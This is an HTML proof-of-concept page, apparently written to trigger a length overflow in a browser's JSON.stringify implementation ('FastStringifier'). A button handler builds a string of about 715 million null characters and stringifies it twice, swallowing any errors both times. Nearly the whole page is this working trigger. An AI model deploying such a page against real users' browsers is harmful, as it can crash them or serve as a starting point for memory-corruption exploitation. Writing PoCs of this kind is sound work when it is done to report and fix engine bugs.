<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>FastStringifier Overflow PoC with Button</title>
    <style>
        #trigger {
            margin: 20px;
            padding: 12px;
            font-size: 18px;
            cursor: pointer;
            background-color: #f44336;
            color: white;
            border: none;
            border-radius: 4px;
        }
        #trigger:hover {
            background-color: #d32f2f;
        }
    </style>
</head>
<body>
    <h1>FastStringifier Overflow PoC</h1>
    <p>Click the button to test string length overflow in JSON.stringify.</p>
    <button id="trigger">Trigger Overflow</button>
    <script>
        document.getElementById('trigger').addEventListener('click', () => {
            try {
                // Create large string (715,827,883 bytes)
                const string = "\x00".repeat(715827883);
                // Trigger overflow in JSON.stringify
                JSON.stringify(string);
            } catch (e) {
                // Silent catch for first attempt
            }
            try {
                // Second attempt
                const string = "\x00".repeat(715827883);
                JSON.stringify(string);
            } catch (e) {}
        });
    </script>
</body>
</html>
